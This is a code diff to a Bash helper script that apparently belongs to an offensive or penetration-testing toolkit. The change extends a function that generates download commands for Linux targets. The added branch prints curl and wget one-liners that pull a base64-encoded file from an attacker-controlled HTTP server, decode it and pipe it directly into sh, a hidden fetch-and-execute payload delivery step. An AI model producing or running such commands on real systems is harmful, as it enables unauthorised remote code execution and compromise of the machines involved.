@@ -106,27 +106,36 @@ generate_download_linux() {
 }
 
 generate_linux_download() {
-    local file="$1"
-    if [ -z "$file" ]; then
+    local input_file="$1"
+    if [ -z "$input_file" ]; then
         echo "File name is required."
         return 1
     fi
-    if [ ! -f "$file" ]; then
-        echo "File $file does not exist."
+    if [ ! -f "$input_file" ]; then
+        echo "File $input_file does not exist."
         return 1
     fi
-    file=$(echo "$file" | sed -E 's/ /%20/g')
-    local output_option=""
+    input_file=$(echo "$input_file" | sed -E 's/ /%20/g')
+    local output_file=""
     if [ ! -z "$2" ]; then
-        output_option="-O \"$2\""
+        output_file="$2"
     else
-        output_option="-O \"$file\""
+        output_file="$input_file"
     fi
+
     if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
         echo "HTTP IP or port is not set."
         return 1
     fi
-    echo "wget http://$http_ip:$http_port/$file $output_option"
+    if [[ $input_file == *.b64 ]]; then
+        echo "curl http://$http_ip:$http_port/$input_file | base64 -d | sh"
+        echo "wget http://$http_ip:$http_port/$input_file -qO- | base64 -d | sh"
+        return 0
+    fi
+    local output_option=""
+    output_option="-O \"$output_file\""    
+    echo "wget http://$http_ip:$http_port/$input_file $output_option"
+
 }
 
 powershell_check_scheduled_task() {
